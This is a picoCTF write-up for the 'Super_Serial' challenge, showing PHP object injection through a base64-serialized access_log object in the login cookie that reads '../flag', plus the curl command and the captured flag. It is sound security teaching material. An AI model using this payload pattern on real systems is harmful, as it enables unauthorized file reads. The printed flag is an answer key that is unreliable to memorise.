# Super_Serial ‚Äì PHP Object Injection

## 1Ô∏è‚É£ Initial Recon

First thing checked:

```
/robots.txt
```

Found:

```
User-agent: *
Disallow: /admin.phps
```

Accessing:

```
/admin.phps
```

didn‚Äôt help much.

Then you tried:

```
index.phps
authentication.phps
```

üî• `.phps` reveals PHP source code.

That‚Äôs the first major discovery.

---

# 2Ô∏è‚É£ Source Code Review ‚Äì index.php

Important line:

```php
setcookie("login", urlencode(base64_encode(serialize($perm_res))), ...);
```

This means:

1. A `permissions` object is created
2. It is serialized
3. Base64 encoded
4. Stored inside cookie `login`

‚ö†Ô∏è This is dangerous because if the server later does:

```php
unserialize(base64_decode($_COOKIE['login']));
```

The user controls the object.

That = **PHP Object Injection**

---

# 3Ô∏è‚É£ authentication.php Source

Now this part is CRITICAL:

```php
class access_log
{
	public $log_file;

	function __construct($lf) {
		$this->log_file = $lf;
	}

	function __toString() {
		return $this->read_log();
	}

	function read_log() {
		return file_get_contents($this->log_file);
	}
}
```

Key point:

```php
function __toString() {
	return $this->read_log();
}
```

Whenever the object is converted to string ‚Üí it reads a file.

That is a file read primitive.

---

# üö® The Vulnerability

If we can inject:

```
access_log
```

object and control:

```
$log_file
```

We can read:

```
../flag
```

And that‚Äôs exactly what the hint said.

---

# 4Ô∏è‚É£ Crafting The Payload

PHP serialized object format:

```
O:<length>:"ClassName":<property_count>:{
    s:<length>:"property_name";<value>;
}
```

---

## üîç Breakdown of Your Payload

Base64:

```
TzoxMDoiYWNjZXNzX2xvZyI6MTp7czo4OiJsb2dfZmlsZSI7czo3OiIuLi9mbGFnIjt9
```

Decoded:

```
O:10:"access_log":1:{s:8:"log_file";s:7:"../flag";}
```

Let‚Äôs break it:

```
O:10:"access_log"
```

* O = object
* 10 = length of class name
* access_log = class name

```
:1:
```

* 1 property

```
s:8:"log_file";
```

* s = string
* 8 = length of "log_file"

```
s:7:"../flag";
```

* s = string
* 7 = length of "../flag"

---

# 5Ô∏è‚É£ Exploit Execution

Send cookie:

```bash
curl -H "Cookie: login=<payload>" \
http://wily-courier.picoctf.net:49907/authentication.php
```

Response:

```
Deserialization error. picoCTF{1_c4nn0t_s33_y0u_2fba20fa}
```

Even though it says ‚ÄúDeserialization error‚Äù ‚Äî the flag is printed.

Why?

Because during object handling, `__toString()` was triggered.

And that called:

```
file_get_contents("../flag")
```

Which printed the flag.

---

# üéØ Why This Works

Because:

* The app trusts serialized objects from cookies
* It unserializes without validation
* It defines a class with file read capability
* We inject that class manually

This is:

> PHP Insecure Deserialization ‚Üí Magic Method Abuse ‚Üí Arbitrary File Read

---

# üî¨ Serialization Explanation

```
O => Object
s => String
i => Integer
a => Array
```

Format:

```
O:<len>:"ClassName":<prop_count>:{
    s:<len>:"prop_name";<value>;
}
```

If length is wrong ‚Üí unserialize fails.

That‚Äôs why counts must match exactly.

---

# üß† Final Exploit Chain

1. Found `.phps` ‚Üí source disclosure
2. Found serialized cookie
3. Found class with file read
4. Crafted malicious object
5. Injected via cookie
6. Triggered `__toString`
7. Read `../flag`
8. Got flag

---

# üèÜ Final Flag

```
picoCTF{1_c4nn0t_s33_y0u_2fba20fa}
```

---

